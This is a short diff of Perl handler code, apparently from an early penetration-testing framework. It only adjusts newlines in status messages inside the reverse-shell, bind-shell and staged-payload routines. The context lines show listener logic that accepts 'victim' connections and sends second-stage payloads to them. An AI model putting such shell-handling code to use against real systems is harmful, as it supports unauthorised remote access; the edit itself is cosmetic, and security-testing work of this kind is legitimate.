@@ -152,7 +152,6 @@ sub reverse_shell
     
     print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
-    
     my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
     
     my $console = $self->ConsoleStart();
@@ -196,7 +195,7 @@ sub impurity_reverse
     my $victim = $self->Listener($exploit, $port);
     return(0) if ! $victim;
     
-    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
    
     local *X;
     if(! open(X, "<".$self->GetVar('PEXEC')))
@@ -252,9 +251,9 @@ sub reverse_shell_staged
     my $victim = $self->Listener($exploit,$port);
     return(0) if ! $victim;
     
-    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
-       
-    print STDERR "[*] Uploading second stage...\n";
+    print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
+    print STDERR "[*] Uploading second stage...\n\n";
+    
     my $stage = $self->GetVar('_Payload')->NextStage();
     $victim->send($stage);
     
@@ -281,9 +280,9 @@ sub bind_shell_staged
     my $victim = $self->Connector($exploit, $host, $port);    
     return if ! $victim;
 
-    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+    print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
+    print STDERR "[*] Uploading second stage...\n\n";
     
-    print STDERR "[*] Uploading second stage...\n";
     my $stage = $self->GetVar('_Payload')->NextStage();
     $victim->send($stage);
 
